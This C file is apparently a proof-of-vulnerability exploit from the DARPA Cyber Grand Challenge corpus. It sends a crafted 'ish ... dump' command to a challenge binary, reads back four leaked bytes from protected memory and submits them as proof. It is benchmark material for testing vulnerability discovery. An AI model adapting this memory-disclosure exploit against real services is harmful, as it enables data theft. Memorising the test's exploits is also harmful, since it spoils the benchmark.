/*

Author: Debbie Nuttall <debbie@cromulence.com>

Copyright (c) 2015 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/
#include "libpov.h"

#define TO_CB   1
#define FROM_CB 0
#define TO_SF   3
#define FROM_SF 3

int cgc_print_integer(char *s, unsigned int i) {
  // Count digits
  int digits = 0;
  unsigned int copy = i;
  if (i == 0) {
    *s = '0';
    return 1;
  }
  while (copy > 0) {
    digits++;
    copy /= 10;
  }
  copy = i;
  // move to end of number
  s += digits;
  while (copy > 0) {
    *s-- = '0' + (copy % 10);
    copy /= 10;
  }
  return digits;
}

int cgc_SendToCB(char *buf, int length) {
  int total_sent = 0;
  int ret;
  cgc_size_t bytes_sent = 0;
  while(total_sent < length) {
    ret = cgc_transmit(TO_CB, buf + total_sent, length - total_sent, &bytes_sent);
    if (ret != 0) {
      // error
      return -1;
    }
    if (bytes_sent == 0) {
      break;
    }
    total_sent += bytes_sent;
  }
  return bytes_sent;
}

int cgc_ReceiveFromCB(char *buf, int length) {
  cgc_size_t total_received = 0;
  cgc_size_t bytes_received = 0;
  int ret;
  while (total_received < length) {
    ret = cgc_receive(FROM_CB, buf + total_received , length - total_received , &bytes_received);
    if (ret != 0) {
      return -1;
    }
    if (bytes_received == 0) {
      break;
    }
    total_received += bytes_received;
  }
  return total_received;
}

int main(int cgc_argc, char *cgc_argv[]) {
  // negotiate
  type2_vals t2vals;
  cgc_type2_negotiate(&t2vals);
  
  // perform POV
  char input[11];
  cgc_ReceiveFromCB(input, 10);
  char bytes[55] = "ish hostname +p password +l username dump 1128775680 \n";
  //print_integer(bytes + 42, t2vals.region_addr);
  cgc_SendToCB(bytes, cgc_strlen(bytes));
  unsigned int i = 0xffffffff;
  cgc_SendToCB("quit\n", 5);
  cgc_ReceiveFromCB((char *)&i, 4);
  cgc_type2_submit((unsigned char *)&i, 4);
  return 0;
}